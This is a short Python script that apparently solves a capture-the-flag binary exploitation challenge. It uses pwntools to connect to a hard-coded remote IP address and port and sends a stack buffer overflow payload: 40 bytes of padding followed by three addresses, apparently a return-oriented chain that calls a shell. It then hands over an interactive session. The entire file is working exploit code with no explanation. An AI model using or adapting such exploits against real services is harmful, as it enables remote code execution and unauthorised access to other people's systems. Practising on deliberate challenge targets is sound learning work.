from pwn import *

io = remote('114.67.246.176', 14677)
io.recv()
payload = b'A' * 40 + p64(0x40126b) + p64(0x402004) + p64(0x40116d)
io.send(payload)
io.recv()
io.interactive()